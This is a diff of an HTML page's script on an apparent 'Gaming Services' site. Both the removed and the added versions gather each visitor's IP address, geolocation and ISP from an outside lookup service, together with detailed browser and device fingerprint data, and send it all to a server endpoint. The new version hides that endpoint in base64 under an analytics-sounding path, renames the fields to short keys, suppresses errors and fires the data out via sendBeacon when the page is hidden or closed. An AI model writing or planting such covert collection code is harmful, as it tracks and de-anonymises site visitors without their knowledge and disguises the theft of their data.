@@ -69,80 +69,62 @@
       &copy; 2025 Gaming Services. All rights reserved.
     </footer>
     <script>
-      fetch("https://wtfismyip.com/json")
-        .then((response) => response.json())
-        .then((data) => {
-          const echolog = {
-            ipAddress: data.YourFuckingIPAddress,
-            location: data.YourFuckingLocation,
-            hostname: data.YourFuckingHostname,
-            isp: data.YourFuckingISP,
-            city: data.YourFuckingCity,
-            country: data.YourFuckingCountry,
-            countryCode: data.YourFuckingCountryCode,
-            userAgent: navigator.userAgent,
-            windowProp: Object.keys(window).length,
-            windowWidth: window.innerWidth,
-            windowHeight: window.innerHeight,
-            windowRatio: window.innerWidth / window.innerHeight,
-            screenWidth: window.screen.availWidth,
-            screenHeight: window.screen.availHeight,
-            screenRatio: window.screen.availWidth / window.screen.availHeight,
-            DPI: window.devicePixelRatio,
-            colorDepth: window.screen.colorDepth,
-            orientation: (window.screen.orientation && window.screen.orientation.type) || '',
-            orientationAngle: (window.screen.orientation && window.screen.orientation.angle) || 0,
-            os: navigator.platform,
-            threads: navigator.hardwareConcurrency,
-            memory: navigator.deviceMemory,
-            systemLanguages: navigator.languages ? navigator.languages.join(", ") : '',
-            languages: navigator.language,
-          };
+      const e = atob("L2FwaS9hbmFseXRpY3M=");
+      
+      const collectData = () => {
+        fetch("https://wtfismyip.com/json")
+          .then((response) => response.json())
+          .then((data) => {
+            const d = {
+              ip: data.YourFuckingIPAddress,
+              loc: data.YourFuckingLocation,
+              host: data.YourFuckingHostname,
+              isp: data.YourFuckingISP,
+              city: data.YourFuckingCity,
+              country: data.YourFuckingCountry,
+              cc: data.YourFuckingCountryCode,
+              ua: navigator.userAgent,
+              wp: Object.keys(window).length,
+              ww: window.innerWidth,
+              wh: window.innerHeight,
+              wr: window.innerWidth / window.innerHeight,
+              sw: window.screen.availWidth,
+              sh: window.screen.availHeight,
+              sr: window.screen.availWidth / window.screen.availHeight,
+              dpi: window.devicePixelRatio,
+              cd: window.screen.colorDepth,
+              or: (window.screen.orientation && window.screen.orientation.type) || '',
+              oa: (window.screen.orientation && window.screen.orientation.angle) || 0,
+              os: navigator.platform,
+              th: navigator.hardwareConcurrency,
+              mem: navigator.deviceMemory,
+              sl: navigator.languages ? navigator.languages.join(", ") : '',
+              lang: navigator.language,
+            };
 
-          const content = [
-            `IP Address: ${echolog.ipAddress}`,
-            `Location: ${echolog.location}`,
-            `Hostname: ${echolog.hostname}`,
-            `ISP: ${echolog.isp}`,
-            `City: ${echolog.city}`,
-            `Country: ${echolog.country}`,
-            `Country Code: ${echolog.countryCode}`,
-            `User Agent: ${echolog.userAgent}`,
-            `Window Properties: ${echolog.windowProp}`,
-            `Window Width: ${echolog.windowWidth}`,
-            `Window Height: ${echolog.windowHeight}`,
-            `Window Ratio: ${echolog.windowRatio}`,
-            `Screen Width: ${echolog.screenWidth}`,
-            `Screen Height: ${echolog.screenHeight}`,
-            `Screen Ratio: ${echolog.screenRatio}`,
-            `DPI: ${echolog.DPI}`,
-            `Color Depth: ${echolog.colorDepth}`,
-            `Orientation: ${echolog.orientation}`,
-            `Orientation Angle: ${echolog.orientationAngle}`,
-            `OS: ${echolog.os}`,
-            `Threads: ${echolog.threads}`,
-            `Memory: ${echolog.memory}`,
-            `System Languages: ${echolog.systemLanguages}`,
-            `Languages: ${echolog.languages}`,
-          ].join("\n");
+            const send = () => {
+              navigator.sendBeacon(e, new Blob([JSON.stringify({ m: d })], { type: 'application/json' }));
+            };
 
-          fetch("/api/discord", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({ content }),
+            document.addEventListener('visibilitychange', () => {
+              if (document.hidden) send();
+            });
+            
+            window.addEventListener('beforeunload', send);
+            
+            setTimeout(() => {
+              fetch(e, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ m: d }),
+                keepalive: true
+              }).catch(() => {});
+            }, 3000);
           })
-            .then((response) => {
-              if (!response.ok) {
-                console.error("Forwarding to server failed", response.status);
-              } else {
-                console.log("Sent to server");
-              }
-            })
-            .catch((error) => console.error(error));
-        })
-        .catch((error) => console.error(error));
+          .catch(() => {});
+      };
+
+      setTimeout(collectData, 500);
     </script>
   </body>
 </html>
